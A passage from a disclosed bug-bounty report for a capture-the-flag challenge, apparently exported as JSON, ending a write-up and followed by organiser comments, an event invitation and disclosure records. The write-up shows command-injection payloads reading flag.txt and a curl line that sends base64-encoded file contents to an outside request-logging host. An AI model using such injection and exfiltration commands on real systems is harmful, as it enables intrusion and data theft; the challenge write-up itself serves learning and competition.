--decode\nuid=1000(hacker) gid=1000(hacker) groups=1000(hacker)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTrying now a \u003ccode\u003e$(ls|base64)\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eapp.py\napp.pyc\nflag.txt\nrequirements.txt\nstatic\nstatus.pi\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd a \u003ccode\u003e$(cat flag.txt|base64)\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eYay! Here is your flag:\n\nflag{cha1n1ng_bugs_f0r_fun_4nd_\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor some reason the base64 is cutted out, but sending a sed command to get the third line \u003ccode\u003ecurl -d $(sed -n 3p flag.txt|base64) http://requestbin.net/r/w8rpj9w8\u003c/code\u003e I get all the flag.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eflag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe impact of the challenge is to get me a ticket to h1-5411\u003c/p\u003e\n","weakness":{"id":54,"name":"XML External Entities (XXE)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-11-21T16:02:31.326Z","allow_singular_disclosure_after":-66405106.790822275,"singular_disclosure_allowed":true,"vote_count":15,"voters":["0xacb","mygf","eveeez","victorrocha","japz","bb00x","spetr0x","den1al","clarckowen_","maluma","and 5 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3399665,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Congratulations on winning our Meme CTF! You are invited to h1-5411 in Buenos Aires on Saturday, September 29, 2018. Please send us your full name and confirm you can attend to receive full details. \n**You must be in Buenos Aires to attend**\n\n{F352152}","markdown_message":"\u003cp\u003eCongratulations on winning our Meme CTF! You are invited to h1-5411 in Buenos Aires on Saturday, September 29, 2018. Please send us your full name and confirm you can attend to receive full details. \u003cbr\u003e\n\u003cstrong\u003eYou must be in Buenos Aires to attend\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e{F352152}\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-28T00:39:13.054Z","updated_at":"2018-09-28T00:39:13.054Z","actor":{"username":"corb3nik","cleared":true,"url":"/corb3nik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wVdvnChZPXG1bBFTnfDMx3zU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3399667,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-28T00:40:55.892Z","updated_at":"2018-09-28T00:40:55.892Z","actor":{"username":"corb3nik","cleared":true,"url":"/corb3nik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wVdvnChZPXG1bBFTnfDMx3zU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3399824,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi !\n\nYes I can attend at the event.\nMy full name is Caio Lüders de Araújo.\n\nThanks.","markdown_message":"\u003cp\u003eHi !\u003c/p\u003e\n\n\u003cp\u003eYes I can attend at the event.\u003cbr\u003e\nMy full name is Caio Lüders de Araújo.\u003c/p\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-28T02:05:18.966Z","updated_at":"2018-09-28T02:05:18.966Z","actor":{"username":"caioluders","cleared":true,"url":"/caioluders","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/127/884/dc42ad1f26281d390990096c4ec2fc5c20c2a31b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3401637,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @caioluders,\n\nThanks! We'll send more details soon and invites to the H1-5411 event program and slack.\nSee you tomorrow!\n","markdown_message":"\u003cp\u003eHello \u003ca href=\"/caioluders\"\u003e@caioluders\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks! We\u0026#39;ll send more details soon and invites to the H1-5411 event program and slack.\u003cbr\u003e\nSee you tomorrow!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-28T14:22:55.683Z","updated_at":"2018-09-28T14:22:55.683Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"caioluders","url":"/caioluders"},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3404475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants!   Please keep an eye on your email for your invite to the program!\n\nBest of luck and happy hacking!","markdown_message":"\u003cp\u003eWe are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants!   Please keep an eye on your email for your invite to the program!\u003c/p\u003e\n\n\u003cp\u003eBest of luck and happy hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-28T22:53:59.915Z","updated_at":"2018-09-28T22:53:59.915Z","actor":{"username":"tiffany-h1","cleared":false,"url":"/tiffany-h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3514763,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. ","markdown_message":"\u003cp\u003eWe would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-22T16:02:31.279Z","updated_at":"2018-10-22T16:02:31.279Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3515063,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-22T17:06:23.683Z","updated_at":"2018-10-22T17:06:23.683Z","actor":{"username":"caioluders","cleared":true,"url":"/caioluders","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/127/884/dc42ad1f26281d390990096c4ec2fc5c20c2a31b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3515064,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-22T17:06:23.744Z","updated_at":"2018-10-22T17:06:23.744Z","actor":{"username":"caioluders","cleared":true,"url":"/caioluders","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/127/884/dc42ad1f26281d390990096c4ec2fc5c20c2a31b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}